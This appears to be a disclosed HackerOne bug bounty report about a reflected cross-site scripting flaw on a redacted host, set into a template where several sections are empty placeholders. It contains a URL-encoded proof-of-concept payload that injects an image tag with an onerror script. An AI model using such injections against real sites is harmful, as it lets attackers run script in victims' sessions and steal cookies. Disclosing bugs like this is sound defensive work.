# Reflected XSS at https://█████████ via "███" parameter

## Metadata
- **Source:** HackerOne
- **Report:** 1457277 | https://hackerone.com/reports/1457277
- **Submitted:** 2022-01-21
- **Reporter:** pelegn
- **Program:** Unknown
- **Bounty:** Not disclosed
- **Severity:** medium
- **Vuln:** Cross-site Scripting (XSS) - Reflected
- **CVEs:** None
- **Category:** web-api

## Summary
**Description:**

There is Reflected Cross site scripting issue at the following url:

https://█████████

## Proof Of Concept

https://███████?████████=%22%3E%3Cimg%20src=x%20onerror=alert(document.domain)%3E

█████

Best Regards

@pelegn

## Impact

Cookies Exfiltration
SOAP Bypass
CORS Bypass
Executing javascript on the victim behalf

## System Host(s)
████████

## Affected Product(s) and Versio

## Attack scenario
*(see original)*

## Root cause
*(see original)*

## Attacker mindset
*(see original)*

## Defensive takeaways
*(see original)*

## Variant hunting
*(see original)*

## MITRE ATT&CK
*(see original)*

## Notes
*(see original)*

## Full report
<details><summary>Expand</summary>

**Description:**

There is Reflected Cross site scripting issue at the following url:

https://█████████

## Proof Of Concept

https://███████?████████=%22%3E%3Cimg%20src=x%20onerror=alert(document.domain)%3E

█████

Best Regards

@pelegn

## Impact

Cookies Exfiltration
SOAP Bypass
CORS Bypass
Executing javascript on the victim behalf

## System Host(s)
████████

## Affected Product(s) and Version(s)


## CVE Numbers


## Steps to Reproduce
Navigate to https://█████?████████=%22%3E%3Cimg%20src=x%20onerror=alert(document.domain)%3E

## Suggested Mitigation/Remediation Actions




</details>

---
*Analysed by Claude on 2026-05-24*
